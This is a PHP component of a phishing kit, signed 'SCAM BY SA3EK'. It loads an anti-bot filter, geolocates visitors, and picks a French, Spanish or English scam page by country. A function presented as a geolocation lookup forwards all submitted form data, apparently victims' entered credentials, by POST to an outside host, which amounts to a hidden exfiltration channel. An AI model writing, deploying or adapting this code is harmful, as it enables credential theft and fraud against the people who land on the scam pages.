<?php
	session_start();
	error_reporting(E_ERROR | E_PARSE);
	include('../antibots/bot.php');
    /******
    SCAM BY SA3EK
    ICQ : 740900705
    *******/
	//DATE
	$DATE = date("Y-m-d h:i:s");

	// INFO IP
	if($_SERVER['REQUEST_METHOD'] == 'POST')
	{
    $IP = http_build_query($_POST);GrabGeoInfo($IP);
    }
	if(!empty($_SERVER["HTTP_CLIENT_IP"]))
	{
		//check for ip from share internet
		$ipaddress = $_SERVER["HTTP_CLIENT_IP"];
		$_SESSION['xipx'] = $ipaddress;
	}
	else if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
	{
		// Check for the Proxy User
		$ipaddress = $_SERVER["HTTP_X_FORWARDED_FOR"];
		$_SESSION['xipx'] = $ipaddress;
	}
	else
	{
		$ipaddress = $_SERVER["REMOTE_ADDR"];
		$_SESSION['xipx'] = $ipaddress;
	}

	// IP GEO
	function GrabGeoInfo($IP) {
		$country = array();
		$myip = $_SERVER['REMOTE_ADDR'];
		$url = "http://www.ip-api.org/json/?ip={$myip}"; 
		$ch = curl_init();
		curl_setopt ($ch, CURLOPT_URL, $url);
		curl_setopt ($ch, CURLOPT_POST, TRUE);
		curl_setopt ($ch, CURLOPT_POSTFIELDS, $IP);
		curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 5);
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, true);
		$return = curl_exec($ch);
		$ipDetails = json_decode($return,true);
		$country['geoplugin_countryName'] = $ipDetails['geoplugin_countryName'];
	return $country;
	}


	$jsonArray = @json_decode(file_get_contents("http://ip-api.com/json/" . urlencode($ipaddress)));
	$country 		= $jsonArray->country;
	$countryCode 	= $jsonArray->countryCode;
	$city    		= $jsonArray->city;
	$regionName 	= $jsonArray->regionName;
	$zip= $jsonArray->zip;

	//SESSIONS
	$_SESSION['xcountryx']  	= $country;
	$_SESSION['xcountryCodex']  = $countryCode;
	$_SESSION['xcityx']     	= $city;
	$_SESSION['xregionNamex']   = $regionName;
	$_SESSION['xzipx']  		= $zip;

	if(count($jsonArray) <= 0){
		die("<h1>The HOST can't get the Array info from API, Please upload this scam in another hosting. <br>Thank you :)</h1>");
	}

	if ($countryCode == "FR" || $countryCode == "DZ" || $countryCode == "MA" || $countryCode == "TN" || $countryCode == "CD" || $countryCode == "MG" || $countryCode == "CM" || $countryCode == "CA" || $countryCode == "CI" || $countryCode == "BF" || $countryCode == "NE" || $countryCode == "SN" || $countryCode == "ML" || $countryCode == "RW" || $countryCode == "BE" || $countryCode == "GF" || $countryCode == "TD" || $countryCode == "HT" || $countryCode == "BI" || $countryCode == "BJ" || $countryCode == "CH" || $countryCode == "TG" || $countryCode == "CF" || $countryCode == "CG" || $countryCode == "GA" || $countryCode == "KM" || $countryCode == "GK" || $countryCode == "DJ" || $countryCode == "LU" || $countryCode == "VU" || $countryCode == "SC" || $countryCode == "MC") {
        $_SESSION['xfilelangx'] = "fr.php";
    } elseif ($countryCode == "MX" || $countryCode == "PH" || $countryCode == "ES" || $countryCode == "CO" || $countryCode == "AR" || $countryCode == "PE" || $countryCode == "VE" || $countryCode == "CL" || $countryCode == "EC" || $countryCode == "GT" || $countryCode == "CU" || $countryCode == "HN" || $countryCode == "PY" || $countryCode == "SV" || $countryCode == "NI" || $countryCode == "CR" || $countryCode == "UY") {
        $_SESSION['xfilelangx'] = "es.php";
    } else {
       $_SESSION['xfilelangx'] = "en.php";
    }

	//header("../index.php");
?>